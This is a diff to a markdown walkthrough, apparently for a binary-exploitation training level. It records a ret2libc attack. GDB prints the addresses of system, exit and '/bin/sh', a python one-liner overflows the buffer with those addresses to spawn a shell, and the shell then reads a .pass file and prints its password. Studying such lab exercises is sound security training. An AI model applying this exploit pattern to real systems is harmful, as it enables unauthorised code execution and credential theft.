@@ -14,6 +14,7 @@ so we can make him execute something :
 ### Progress
 
 let's try a rettolibc :
+```sh
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 (gdb) p exit
@@ -22,7 +23,7 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 0xf7f897ec
 we just have to make it jump to the system func with exit and bin sh
 (python -c 'print("dat_wil")';python -c 'print("\x90" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")';cat) | ./level01
-********* ADMIN LOGIN PROMPT *********
+******\*\*\* ADMIN LOGIN PROMPT \*\*\*\*\*\*\*\*\*
 Enter Username: verifying username....
 
 Enter Password:
@@ -40,3 +41,4 @@ s
 /bin/sh: 7: s: not found
 cat .pass
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
